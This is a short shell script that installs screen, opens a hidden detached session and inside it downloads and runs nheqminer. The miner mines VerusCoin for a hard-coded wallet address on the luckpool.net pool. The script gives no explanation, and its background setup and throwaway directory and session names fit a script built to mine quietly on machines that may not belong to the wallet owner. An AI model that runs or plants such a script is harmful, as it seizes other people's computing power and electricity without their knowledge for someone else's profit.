#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layer" -d -m
screen -r "layer" -X stuff $'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RMB6RJ7Wv7iVpBKQhdn4Vyv34VFKpD8Eqi.$(shuf -i 1-99999 -n 1) -p x -t 4\n'
